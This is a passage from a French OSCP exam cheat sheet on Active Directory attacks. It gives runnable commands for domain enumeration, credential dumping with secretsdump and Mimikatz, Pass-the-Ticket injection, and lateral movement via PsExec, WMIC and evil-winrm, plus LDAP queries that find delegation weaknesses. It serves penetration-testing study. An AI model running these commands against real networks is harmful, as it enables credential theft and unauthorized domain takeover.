secretsdump.py [domain].com/[VALID_USERNAME]:[VALID_PASSWORD]@[IP]

```


<p class="oscp-command-note">Énumérer les utilisateurs du domaine.</p>

```powershell
Get-ADUser -Filter * | Select-Object Name, SamAccountName

```




```text
Find-DomainShare -Writable

```


<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>

```powershell
Get-ADGroupMember -Identity "Domain Admins"

```


### Techniques d’évasion de la détection


**Paramètres et repères :**
`CrackMapExec`  


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1

```


**Paramètres et repères :**
`rpcclient`  


### Interfaces web d'énumération de domaine

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 3389 --script rdp-ntlm-info [IP]

```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method invoke_command

```


<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>

```bash
ldapsearch -x -h [IP] -p 9389

```


### Exemples de résultats




```text
Domain Name: DOMAIN.LOCAL
Domain SID: S-1-5-21-123456789-1234567890-123456789
Users:
  [*] Administrator
  [*] Guest

```


**Paramètres et repères :**
`CrackMapExec`  




```text
192.168.123.10 - SMB         [*] domain.local\esolis:Password2024! (Pwned!)

```




```text
dn: CN=Emma Solis,OU=Users,DC=domain,DC=local
sAMAccountName: esolis
userPrincipalName: esolis@domain.local

```



### Rechercher les délégations Kerberos contraintes

Lire les attributs msDS-AllowedToDelegateTo pour repérer les services configurés.

<p class="oscp-command-note">Rechercher les délégations Kerberos contraintes.</p>

```bash
ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(msDS-AllowedToDelegateTo=*)' dn sAMAccountName msDS-AllowedToDelegateTo
```

### Délégation sans contrainte

Contrôler les objets qui possèdent le bit TRUSTED_FOR_DELEGATION, sans modifier leur configuration.

<p class="oscp-command-note">Délégation sans contrainte.</p>

```bash
ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' dn sAMAccountName
```

## Réutilisation de tickets Kerberos (Pass-the-Ticket, PtT)


**TGT actif présent en mémoire**

A valid TGT from a privileged user must be present, for example that it was cached by a Domain Admin that logged in before.


**Privilèges SYSTEM**

Needed to access LSASS memory where Kerberos tickets are stored.


**Administrateur local**

Often sufficient, as it allows escalation to SYSTEM or LSASS access tools.


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz
privilege::debug
sekurlsa::tickets

```




```powershell
# Cela enregistrera les fichiers .kirbi sur le disque. Identifier le bon TGT en fonction de l'utilisateur et du type de chiffrement.
sekurlsa::tickets /export

```




```powershell
kerberos::ptt C:\path\to\admin_ticket.kirbi

```


**Paramètres et repères :**
`klist`  


<p class="oscp-command-note">Interroger les informations système via WMI.</p>

```powershell
# Depuis Windows

# Utilisation de VMI
wmic /node:[target_host] process call create "cmd.exe"

# Utilisation de PsExec - SysInternal (Peut encore nécessiter des creds en texte simple sauf si la session SMB prend le ticket Kerberos)
PsExec.exe \\[target_host] -u [domain]\[username] cmd.exe

# Utilisation de WinRM (PowerShell Remoting)
Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential [domain]\[username]

# RDP: utilisez mstsc (Remote Desktop), si TGT est injecté correctement et que la confiance du domaine le permet, vous n'êtes pas invité pour un mot de passe.

```


<p class="oscp-command-note">Script shell dans la rubrique « Pass-the-Ticket (PtT) ».</p>

```bash
# Depuis Kali

# Transférer le .kirbi sur votre machine Kali (utiliser les techniques de la section 17), puis convertir le billet .kirbi
kirbi2ccache [ticket_file].kirbi > [ticket_file].ccache
export KRB5CCNAME=./[ticket_file].ccache

# Utilisation de PsExec
psexec.py -k -no-pass [domain]/[username]@[target_host]

# Utilisation de Evil-WinRM
evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]

```


## Délégations et attributs Kerberos à vérifier

Ces requêtes LDAP identifient des configurations à examiner. La présence d'un attribut ne prouve ni l'exploitation ni l'absence de contrôle compensatoire.

### Délégation RBCD (Resource-Based Constrained Delegation)

Identifier les objets ayant un descripteur de délégation RBCD ; analyser ensuite les permissions réellement accordées.

<p class="oscp-command-note">Délégation RBCD (Resource-Based Constrained Delegation).</p>

```bash
ldapsearch -LLL -x -H ldap://<DC_IP> -D '<DN_COMPTE>' -W -b '<BASE_DN>' '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' dn sAMAccountName
```

### Shadow Credentials (attribut msDS-KeyCredentialLink)

Rechercher les objets qui possèdent une clé liée à un mécanisme d'authentification par clé publique.

<p class="oscp-command-note">Shadow Credentials (attribut msDS-KeyCredentialLink).</p>

```bash
ldapsearch -LLL -x -H ldap://<DC_IP> -D '<DN_COMPTE>' -W -b '<BASE_DN>' '(msDS-KeyCredentialLink=*)' dn sAMAccountName
```

### Contrôle de l'horloge

Vérifier la synchronisation horaire du poste avant de diagnostiquer des échecs Kerberos.

<p class="oscp-command-note">Contrôle de l'horloge.</p>

```bash
timedatectl status
```

**Référence complémentaire :** [Notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/19_ad_exploitation.md). Explications rédigées pour SKILL-ISSUE.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
